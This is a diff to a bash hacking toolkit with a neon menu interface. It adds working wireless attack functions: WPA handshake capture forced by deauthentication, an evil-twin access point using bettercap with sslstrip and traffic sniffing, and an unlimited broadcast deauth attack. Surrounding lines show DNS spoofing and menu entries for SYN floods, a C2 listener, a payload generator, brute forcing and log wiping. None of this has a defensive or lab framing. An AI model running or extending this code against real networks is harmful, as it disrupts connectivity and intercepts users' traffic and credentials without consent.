@@ -319,6 +319,57 @@ dns_hijack() {
     sudo bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $rip; dns.spoof on; net.sniff on"
 }
 
+# --- SIGINT & WIRELESS MODULES ---
+
+wifi_handshake() {
+    echo -e "${NEON_PINK}[!] INITIATING WPA HANDSHAKE CAPTURE${RESET}"
+    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
+    
+    echo -e "${NEON_BLUE}[*] Enabling Monitor Mode on $INTERFACE...${RESET}"
+    sudo airmon-ng start "$INTERFACE" > /dev/null
+    local MON_IFACE="${INTERFACE}mon"
+    
+    echo -e "${NEON_BLUE}[*] Scanning for targets... (Press Ctrl+C when you see your target)${RESET}"
+    sudo timeout 20 airodump-ng "$MON_IFACE" || true
+    
+    echo -ne "${NEON_BLUE}    Enter Target BSSID: ${RESET}"; read bssid
+    echo -ne "${NEON_BLUE}    Enter Target Channel: ${RESET}"; read channel
+    
+    echo -e "${NEON_BLUE}[*] Capturing handshake on $bssid (Channel $channel)...${RESET}"
+    echo -e "${NEON_BLUE}[*] Launching deauth in background to force reconnection...${RESET}"
+    (sudo aireplay-ng --deauth 10 -a "$bssid" "$MON_IFACE" > /dev/null 2>&1) &
+    
+    sudo timeout 60 airodump-ng --bssid "$bssid" -c "$channel" -w "/tmp/handshake_${bssid//:/}" "$MON_IFACE"
+    
+    sudo airmon-ng stop "$MON_IFACE" > /dev/null
+    echo -e "${NEON_BLUE}[+] Capture attempt finished. Check /tmp/handshake_*.cap${RESET}"
+}
+
+evil_twin_start() {
+    echo -e "${NEON_PINK}[!] INITIATING EVIL TWIN CAPTIVE PORTAL${RESET}"
+    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
+    
+    echo -ne "${NEON_BLUE}    Enter SSID to spoof: ${RESET}"; read ssid
+    echo -e "${NEON_BLUE}[*] Starting bettercap evil-twin for $ssid...${RESET}"
+    echo -e "${NEON_PINK}[!] This requires the 'http.proxy' and 'wifi' caplets.${RESET}"
+    sudo bettercap -eval "set wifi.ap.ssid $ssid; wifi.ap on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
+}
+
+wifi_deauth() {
+    echo -e "${NEON_PINK}[!] INITIATING DEAUTH ATTACK${RESET}"
+    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
+    
+    echo -ne "${NEON_BLUE}    Target BSSID: ${RESET}"; read bssid
+    echo -ne "${NEON_BLUE}    Client MAC (FF:FF:FF:FF:FF:FF for all): ${RESET}"; read client
+    
+    sudo airmon-ng start "$INTERFACE" > /dev/null
+    sudo aireplay-ng --deauth 0 -a "$bssid" -c "$client" "${INTERFACE}mon"
+    sudo airmon-ng stop "${INTERFACE}mon" > /dev/null
+}
+
 # --- UI & GUI ENGINE ---
 
 show_banner() {
@@ -381,6 +432,7 @@ grim_gui() {
         echo -e " ${NEON_BLUE}    [2] DEEP SEARCH & OSINT HUB${RESET}"
         echo -e " ${NEON_BLUE}    [3] CYBER WARFARE OPERATIONS${RESET}"
         echo -e " ${NEON_BLUE}    [4] ETHERNET & INTERNAL OPS${RESET}"
+        echo -e " ${NEON_BLUE}    [5] SIGNAL INTELLIGENCE (SIGINT)${RESET}"
         echo -e ""
         echo -e " ${NEON_BLUE} [O] STEALTH  [U] BLUR IP  [M] GHOST MODE  [X] EXIT${RESET}"
         echo -e ""
@@ -392,6 +444,7 @@ grim_gui() {
             2) gui_deep_search ;;
             3) gui_warfare ;;
             4) gui_ethernet ;;
+            5) gui_sigint ;;
             O|o) toggle_tor ;;
             U|u) if [ "$BLUR_IP" = true ]; then BLUR_IP=false; else BLUR_IP=true; fi ;;
             M|m) ghost_mode; echo -e "\n${NEON_BLUE}[!] Task Complete. Press Enter...${RESET}"; read ;;
@@ -482,24 +535,41 @@ gui_deep_search() {
     done
 }
 
+gui_sigint() {
+    while true; do
+        show_banner
+        echo -e " ${NEON_BLUE}┌─ SIGNAL INTELLIGENCE (SIGINT) ──────────────────────────────┐${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [W] WIFI DEAUTH     [H] HANDSHAKE CAP   [E] EVIL TWIN       ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [B] BLUETOOTH RECON [S] SNIFFER         [K] KILL CONNECTION ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
+        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
+        read sub; if [[ "$sub" == "b" ]]; then return; fi
+        case $sub in
+            W|w) bash "$0" deauth; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            H|h) bash "$0" handshake; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            E|e) bash "$0" evil_twin; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            B|b) bash "$0" bt; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            S|s) bash "$0" sniff; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            K|k) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+        esac
+    done
+}
+
 gui_warfare() {
     while true; do
         show_banner
         echo -e " ${NEON_BLUE}┌─ CYBER WARFARE OPERATIONS ──────────────────────────────────┐${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [F] MULTI-FLOOD     [G] AGGRESSIVE ARP  [H] KILL CONNECTION ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [I] WI-FI DEAUTH    [J] VULN SCAN (NUC) [L] WEB FUZZ (FFUF) ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [N] SQL INJECT TEST [Y] MALWARE (YARA)  [Z] DEPLOY HONEYPOT ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [T] TAKEOVER AUDIT  [V] BRUTE FORCE     [R] HASH CRACKER    ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [Q] PAYLOAD GEN     [@] GHOST WIPE      [#] C2 LISTENER     ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [$] DNS HIJACK      [W] WP AUDIT        [S] SNIFFER         ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [F] MULTI-FLOOD     [G] AGGRESSIVE ARP  [J] VULN SCAN (NUC) ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [L] WEB FUZZ (FFUF) [N] SQL INJECT TEST [Y] MALWARE (YARA)  ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [Z] DEPLOY HONEYPOT [T] TAKEOVER AUDIT  [V] BRUTE FORCE     ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [R] HASH CRACKER    [Q] PAYLOAD GEN     [@] GHOST WIPE      ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [#] C2 LISTENER     [$] DNS HIJACK      [W] WP AUDIT        ${NEON_BLUE}│${RESET}"
         echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
         echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
         read sub; if [[ "$sub" == "b" ]]; then return; fi
         case $sub in
             F|f) echo -ne "    Target IP: "; read t; bash "$0" flood "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             G|g) bash "$0" arp; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
-            H|h) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
-            I|i) echo -ne "    BSSID: "; read t; bash "$0" deauth "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             J|j) echo -ne "    Target: "; read t; bash "$0" nuclei "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             L|l) echo -ne "    URL: "; read t; bash "$0" fuzz "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             N|n) echo -ne "    URL with ID: "; read t; bash "$0" sqlmap "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
@@ -513,7 +583,6 @@ gui_warfare() {
             '#') c2_listener; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             '$') dns_hijack; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             W|w) echo -ne "    WP URL: "; read t; bash "$0" wpscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
-            S|s) bash "$0" sniff; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
         esac
     done
 }
@@ -614,6 +683,8 @@ if [ -z "$TARGET" ] || [ "$TARGET" == "help" ]; then
     echo -e "  exploit   - Search remote databases (Vulners/ExploitDB) for versions."
     echo -e "  flood     - High-intensity TCP SYN flood (Remote/Local)."
     echo -e "  arp       - Aggressive ARP scanning and discovery."
+    echo -e "  handshake - Capture WPA Handshake (Wireless)."
+    echo -e "  evil_twin - Start Evil Twin Captive Portal (Wireless)."
     echo -e "${NEON_BLUE}STANDARD MODES:${RESET}"
     echo -e "  <Domain/IP/Phone/Email/User/File/Scan/Cloud/Web/Vuln/CMS/Net/Sniff/Kill/Mac>"
     exit 0
@@ -636,6 +707,9 @@ elif [[ "$TARGET" == "arp" ]]; then TYPE="ARP"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "email" ]]; then TYPE="EMAIL"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "phone" ]]; then TYPE="PHONE"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "deauth" ]]; then TYPE="DEAUTH"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "handshake" ]]; then TYPE="HANDSHAKE"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "evil_twin" ]]; then TYPE="EVIL_TWIN"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "bt" ]]; then TYPE="BT"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "nuclei" ]]; then TYPE="NUCLEI"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "user" ]]; then TYPE="USER_TRACE"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "fuzz" ]]; then TYPE="FUZZ"; TARGET=$EXTRA;
@@ -700,6 +774,9 @@ case $TYPE in
     EMAIL) email_osint "$TARGET" ;;
     PHONE) phone_osint "$TARGET" ;;
     DEAUTH) wifi_deauth "$TARGET" ;;
+    HANDSHAKE) wifi_handshake ;;
+    EVIL_TWIN) evil_twin_start ;;
+    BT) bt_recon ;;
     NUCLEI) vuln_scan "$TARGET" ;;
     USER_TRACE) user_trace "$TARGET" ;;
     FUZZ) web_fuzz "$TARGET" ;;
